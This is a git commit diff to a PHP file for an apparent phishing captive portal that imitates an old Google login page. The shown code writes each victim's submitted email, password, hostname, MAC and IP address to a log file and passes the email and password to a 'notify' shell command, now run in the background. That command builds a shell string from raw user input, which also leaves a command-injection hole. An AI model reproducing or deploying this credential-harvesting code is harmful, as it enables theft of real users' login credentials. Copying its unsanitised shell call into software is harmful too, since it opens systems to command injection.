00836048dc4bb370ba29cab9870c39503b93b1f3
H4xl0r <31049432+H4xl0r@users.noreply.github.com>
2019-03-26 01:28:27 +0100

    Update MyPortal.php

--- portals/old-google-login/MyPortal.php
+++ portals/old-google-login/MyPortal.php
@@ -46,8 +46,7 @@ class MyPortal extends Portal
             $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
             $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
             file_put_contents("$dir/evilportal-logs/old-google-login.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
-            
-            exec("notify $email' - '$pwd");
+            $this->execBackground("notify $email' - '$pwd");
         }
         // handle form input or other extra things there
 
